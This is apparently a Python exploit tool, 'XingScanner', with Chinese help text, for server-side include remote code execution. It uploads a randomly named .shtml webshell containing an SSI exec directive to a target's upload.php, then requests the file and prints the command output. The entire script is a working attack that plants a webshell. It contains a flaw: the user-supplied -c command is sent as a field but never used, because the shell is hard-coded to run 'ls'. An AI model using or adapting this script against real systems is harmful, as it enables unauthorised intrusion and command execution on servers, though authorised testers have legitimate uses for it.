import random
import sys
import urllib.request
import argparse
import sys
from urllib.parse import urlparse

import requests
from colorama import Fore, Style


def create_parser():
    """创建并配置参数解析器"""

    parser = argparse.ArgumentParser(
        prog="XingScanner",
        description="ssi-rce 漏洞检测工具",
        epilog=f"{Fore.GREEN}Created by Mahua | 仅限授权测试使用{Style.RESET_ALL}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )

    # 必选参数组
    required = parser.add_argument_group(f"{Fore.YELLOW}必选参数{Style.RESET_ALL}")
    required.add_argument("-t", "--target",
                          required=True,
                          help=f"目标URL (示例: {Fore.BLUE}http://target.com/upload.php{Style.RESET_ALL})")

    # 可选参数组
    optional = parser.add_argument_group(f"{Fore.CYAN}可选参数{Style.RESET_ALL}")
    optional.add_argument("-c", "--command",
                          default="whoami",
                          help=f"要执行的系统命令 (默认: {Fore.GREEN}%(default)s{Style.RESET_ALL})")
    optional.add_argument("-o", "--output",
                          type=argparse.FileType('w'),
                          help="结果输出文件路径")
    optional.add_argument("-v", "--verbose",
                          action="count",
                          default=0,
                          help="详细模式 (-v 详细信息, -vv 调试输出)")
    optional.add_argument("-h", "--help",
                          action="store_true",
                          help="显示帮助信息")

    return parser


def precheck_arguments(parser):
    """预处理帮助请求和空参数场景"""

    # 显式帮助请求优先
    if any(arg in sys.argv for arg in ('-h', '--help')):
        parser.print_help()
        sys.exit(0)

    # 空参数场景处理
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)


def check_vulnerability(url, command):
    """
    检查目标 IP 是否存在 ssi-rce  漏洞
    """

    parsed = urlparse(url)
    ip = parsed.netloc
    target_url = f"{parsed.scheme}://{parsed.netloc}"
    url = fr"http://{ip}/upload.php"
    rand_str = ''.join(random.choices('abcdefghijkmnpqrstuvwxyz', k=6))
    webshell_name = f'{rand_str}.shtml'
    webshell_content = "<!--#exec cmd='ls' -->"

    files = {
        'file_upload': (webshell_name, webshell_content, 'text/html')
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": target_url,
        "Origin": target_url
    }

    response = requests.post(url, files=files, headers=headers, verify=False)
    if response.status_code == 200:
        print(f"[+] Webshell 疑似上传成功: {target_url}/{webshell_name}")

    webshell_path = f'{target_url}/{webshell_name}'

    data = {
        "cmd": command,
    }

    response = requests.post(webshell_path, data=data, headers=headers, verify=False)
    if response.status_code == 200:
        print(response.text)
        print(f"{Fore.GREEN}[+] 命令'ls'执行成功: {Style.RESET_ALL}")

def main():
    parser = create_parser()
    precheck_arguments(parser)
    args = parser.parse_args()
    url = args.target
    command = args.command
    check_vulnerability(url, command)


if __name__ == "__main__":
    main()